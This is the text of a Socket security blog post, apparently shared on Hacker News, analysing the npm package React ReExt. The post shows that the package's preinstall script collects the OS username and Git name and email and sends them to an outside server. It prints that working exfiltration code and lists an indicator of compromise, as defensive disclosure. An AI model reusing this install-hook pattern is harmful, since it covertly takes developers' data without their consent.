{"aid": "40080674", "title": "NPM Package for ReExt React Components Library Exfiltrates Git Credentials", "url": "https://socket.dev/blog/npm-package-for-reext-react-components-library-exfiltrates-git-credentials", "domain": "socket.dev", "votes": 1, "user": "feross", "posted_at": "2024-04-18 21:02:29", "comments": 0, "source_title": "npm Package for ReExt React Components Library Exfiltrates Git Credentials - Socket", "source_text": "npm Package for ReExt React Components Library Exfiltrates Git Credentials -\nSocket\n\nSign inDemo\n\n# npm Package for ReExt React Components Library Exfiltrates Git Credentials\n\n## The Socket Research team found this npm package includes code for\ncollecting sensitive developer information, including your operating system\nusername, Git username, and Git email.\n\nSarah Gooding\n\nSocket Research Team\n\nApril 18, 2024\n\nThe Socket Research Team has been investigating an npm package called React\nReExt, which poses a number of security risks and appears to contain spyware.\nThe package provides React components for the Sencha ExtJS Framework but is\nnot officially offered by the company. The package\u2019s README file claims it is\nmaintained by Marc Gusmano, a former engineer at Sencha.\n\nReact ReExt was first published to npm in April 2023, and has gained moderate\npopularity with nearly 11,000 downloads one week in October 2023, multiple\nweeks over 2,000, with an average around 400 weekly downloads at this time.\n\n## ReExt Exfiltrates Sensitive Developer Information without Consent#\n\nOur researchers found that the code was designed to collect sensitive\ndeveloper information, including your operating system username, Git username,\nand Git email.\n\nExamining versions from earlier this week, the \u2018preinstall.js\u2019 file performs\nthis data collection without consent or prior notification. The package\ndynamically forms a URL incorporating details like the operating system\n(osname), Git username, and email as query parameters. Subsequently, it\ninitiates either an HTTP or HTTPS GET request to this URL, contingent upon the\nvalue of osname. This process of URL generation and request dispatching\noperates conditionally.\n\nIf osname matches 'xmarcgusmano', it opts for an HTTP connection to\nhttp://localhost:1962. Otherwise, it resorts to an HTTPS connection targeting\n'<hxxps://2tak.l.serverhost.name:1962>'.\n\nThreat Analysis of Code:\n\n  * Imports essential modules for file handling, network communication, operating system information access, and stylized console logging.\n  * Fetches the current operating system username for potential use in subsequent actions.\n\n    \n    \n    try { const fs = require('fs'); const https = require('https'); const http = require('http'); const os = require(\"os\"); const userInfo = os.userInfo(); var osname = userInfo.username var isFolderExist console.log('\\n') const {default:chalk} = await import(\"chalk\"); const l = (s) => { var prefix = '* ReExt: ' console.log(chalk.blue(prefix+s))\n\n\u2022 Attempts to read the user's Git configuration file (~/.gitconfig). If\nsuccessful, extracts the user's name and email.\n\n    \n    \n    var iniparser = require('iniparser'); var home_dir = process.env.HOME || process.env.HOMEPATH || process.env.USERPROFILE; var config_file = home_dir+'/.gitconfig'; var exists = fs.existsSync(config_file); var config = {} if (exists) { config = iniparser.parseSync(config_file); } else { config = {user:{name:'none',email:'none'}} }\n\n  * If the operating system username is 'xmarcgusmano', the code connects to a local server (http://localhost:1962) using an unencrypted HTTP protocol. This suggests the package might be tailored for a specific target or in a testing phase.\n  * Constructs a https request to 'hxxps://2tak.l.serverhost.name:1962\u2019. The request includes the gathered operating system username, Git username, and Git email address as query parameters.\n\n    \n    \n    var url if (osname === 'xmarcgusmano') { server = 'http://localhost:1962'; url = `${server}/mobile/reext?osname=${osname}&gitname=${config.user.name}&gitemail=${config.user.email}`; http.get(url, doIt).on(\"error\", () => {console.log('**2\\n\\n')}); } else { server = 'https://2tak.l.serverhost.name:1962'; url = `${server}/mobile/reext?osname=${osname}&gitname=${config.user.name}&gitemail=${config.user.email}`; https.get(url, doIt).on(\"error\", () => {console.log('**2\\n\\n')}); } } catch(e) { console.log('* ReExt: - error: ' + e.toString()) }\n\nNowhere in the README file or project description has the package's author\nmentioned that they will be collecting the user's information present in the\nGit config. There is also no mention of this domain used for collection -\n'hxxps://2tak.l.serverhost.name:1962/' - and it seems they don't have any\nrelation with the npm package.\n\nUpon looking up the DNS information of the domain, Socket researchers found\nthis IP address '176.223.135.31' situated in 'Lithuania'\nhxxps://www.ip2location.com/demo/176.223.135.31. The domain also appears to be\ninvolved in some crypto trading:\nhxxps://2tak.l.serverhost.name:1962/#/coinbase.\n\nWhen first researching this package, it wasn't clear whether the publisher of\nthe package was targeting GitHub user mgusmano or exploiting his reputation to\ngain trust for spreading this malicious package on the npm registry.\n\nWe emailed the address on the mgusmano GitHub profile, and he responded, \"we\ndo gather developer information, but only on developer consent.\" When\nquestioned further about the data collection, he was not forthcoming about if\nhe is currently affiliated with Sencha or where the data was being sent. He\nlater responded that the code was \"experimental at the moment\" and that he\nwould obtain consent in the form of a free trial dialog.\n\nAfter our communication, he updated the package to comment out some of the\ncode in question in the preinstall.js file.\n\n    \n    \n    var url // if (osname === 'xmarcgusmano') { // server = 'http://localhost:1962'; // url = `${server}/mobile/reext?osname=${osname}&gitname=${config.user.name}&gitemail=${config.user.email}`; // http.get(url, doIt).on(\"error\", () => {console.log('**2\\n\\n')}); // } // else { // server = 'https://2tak.l.serverhost.name:1962'; // url = `${server}/mobile/reext?osname=${osname}&gitname=${config.user.name}&gitemail=${config.user.email}`; // https.get(url, doIt).on(\"error\", () => {console.log('**2\\n\\n')}); // } } catch(e) { console.log('* ReExt: - error: ' + e.toString()) }\n\nIt's not clear whether he intends to re-enable this data collection in the\nfuture, as it's oddly left in the package and commented out. There was no\ndisclaimer mentioned in the project description file in previous versions\nregarding any experimentation with data collection, and there is no way to\nconfirm what data was sent since we do not have access to the remote server\nidentified in the code.\n\n## Security Implications#\n\nThis package remains suspicious and is a good example of hidden Telemetry, one\nof Socket's high severity alerts which notifies developers if a package is\ntracking how it\u2019s being used.\n\nDevelopers should be aware of this package's unauthorized data access and\nexfiltration, specifically sending git configuration details to a remote\nserver. Stolen emails can be used in phishing attacks and attempts at\ncredential theft.\n\nIn summary, this package was caught collecting important developer information\nand sending it to a suspicious domain. Communication with the package author\nrevealed inconsistencies and evasions that only deepen concerns about the\nintentions for publishing the package on npm. Developers should remain\nextremely cautious, scrutinize the components they integrate into their\nprojects, and always follow up on packages flagged for Telemetry.\n\nIf you're not yet using Socket, you can install the free GitHub app in two\nclicks to get Telemetry notices like this, and 70+ other indicators of supply\nchain risk.\n\n### Indicators of Compromise (IOCs):\n\n  * hxxps://2tak.l.serverhost.name:1962\n\nCredits to the Socket Research Team: Dhanesh Dodia, Sambarathi Sai, Viren\nSaroha\n\nSubscribe to our newsletter\n\nGet notified when we publish new security blog posts!\n\n## Related posts\n\nBack to all posts\n\nSecurity News\n\n### OpenJS: \u201cXZ Utils Cyberattack Likely Not an Isolated Incident\u201d\n\nOpenJS is warning of social engineering takeovers targeting open source\nprojects after receiving a credible attempt on the foundation.\n\nBy Sarah Gooding - Apr 17, 2024\n\nCompany News\n\n### Connect with Socket at RSA and BSidesSF 2024\n\nCome meet the Socket team at BSidesSF and RSA! We're sponsoring several fun\nnetworking events and we would love to see you there.\n\nBy Sarah Gooding - Apr 15, 2024\n\nSecurity News\n\n### OSI to Lead Discussions on Navigating the Challenges of Doing Business\nwith Open Source\n\nOSI is starting a conversation aimed at removing the excuse of the SaaS\nloophole for companies navigating licensing and the complexities of doing\nbusiness with open source.\n\nBy Sarah Gooding - Apr 12, 2024\n\nProduct\n\n  * Package Alerts\n\n  * Integrations\n\n  * Docs\n\n  * Pricing\n\n  * FAQ\n\n  * Roadmap\n\nAbout\n\n  * About\n\n  * Love\n\n  * Blog\n\n  * Glossary\n\n  * Discord Community\n\n  * CareersHiring\n\n  * Send Feedback\n\n  * Contact Us\n\n  * System Status\n\nPackages\n\n  * npm Package Directory\n\n  * Explore npm Packages\n\n  * Go Package Directory\n\n  * Explore Go Packages\n\n  * Maven Package Directory\n\n  * Explore Maven Packages\n\n  * PyPi Package Directory\n\n  * Explore PyPi Packages\n\n  * Most Popular JS Packages\n\n  * Top JavaScript Maintainers\n\n  * Removed npm Packages\n\n  * Random npm Package\n\nStay in touch\n\nGet open source security insights delivered straight into your inbox.\n\n  * Terms\n  * Privacy\n  * Security\n\nMade with \u26a1\ufe0f by Socket Inc\n\n", "frontpage": false}
